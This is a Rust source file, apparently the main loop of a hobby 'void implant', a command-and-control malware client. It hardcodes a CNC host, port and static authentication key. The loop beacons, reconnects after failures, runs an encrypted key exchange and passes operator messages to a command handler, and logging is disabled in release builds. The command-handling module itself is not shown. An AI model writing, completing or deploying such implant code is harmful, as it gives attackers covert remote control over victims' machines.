mod client;

use core::time;
use std::io::{ErrorKind, Write};

#[cfg(debug_assertions)]
use log::{info, warn, error};

use libvoid::{select::*, errors::VoidResult};
use client::CncClient;

static CNC_HOST: &str = "127.0.0.1";
static CNC_PORT: &str = "8080";
// The key is sent with the helo message, to "prove" that we are legit. 
// It could be intercepted I know I know
static CNC_KEY: u32 = 0xcafebabe; 

static CNC_PING_INTERVAL: u64 = 5;

fn main() -> VoidResult<()> {

    // Inititalise the logger
    if cfg!(debug_assertions) {
        env_logger::builder()
            .format(|buf, record| writeln!(buf, "{} - {}", record.level(), record.args()))
            .filter_level(log::LevelFilter::max())
            .try_init()
            .unwrap();
    }

    info!("Starting void implant");

    let mut client = CncClient::new(CNC_HOST, CNC_PORT, CNC_KEY);

    loop {
        // Creating FD sets for select to be used
        let mut fdsetrd = FdSet::new();
        let mut fdsetwr = FdSet::new();

        if client.get_fd() == -1 {
            match client.connect() {
                Ok(_) => {
                    info!("Connected to CNC.");
                    client.reset_ping()?;
                    // These functions set the opening and sealing keys to use aead later
                    client.initiate(1)?;
                    client.initiate(2)?;
                    client.key_exchane_ok()?;
                    info!("Key exchange ok!");
                },
                Err(e) => {
                    match e.kind() {
                        ErrorKind::ConnectionRefused => {
                            warn!("Connection refulsed to {}", client.get_addr());
                            std::thread::sleep(time::Duration::from_secs(2));
                            continue;
                        },
                        _ => {
                            error!("Unknown error: {:?}", e);
                            continue;
                        }
                    }
                }
            };
        }

        client.should_ping()?;


        match client.ready_to_send() {
            true => fdsetwr.set(client.get_fd()),
            false => fdsetrd.set(client.get_fd())
        };

        // Select to see which stream is ready to be read or ready to write to
        // OS make sure to pause when waiting for IO so the CPU doesn't burn
        match select(
            client.get_fd()+1,
            Some(&mut fdsetrd),
            Some(&mut fdsetwr),
            None,
            Some(&make_timeval(time::Duration::new(5, 0)))
        ) {
            Ok(_) => {
                if fdsetrd.isset(client.get_fd()) { // Ready to read
                    let bytes_read = match client.recv() {
                        Ok(val) => val,
                        Err(_) => {
                                client.teardown_connection().unwrap();
                                continue;
                            }
                        };
                    if bytes_read == 0 {
                        client.teardown_connection().unwrap();
                        continue;
                    }
                    match client.handle() {
                        Ok(_) => (),
                        Err(e) => {
                            error!("Got error {:?}", e);
                            continue;
                        }
                    };

                }
                if fdsetwr.isset(client.get_fd()) { // Ready to write
                    match client.send() {
                        Ok(_) => (),
                        Err(_) => continue
                    }
                }
            },
            Err(e) => {
                error!("Error: {:?}", e);
                continue;
            }
        };

    }
}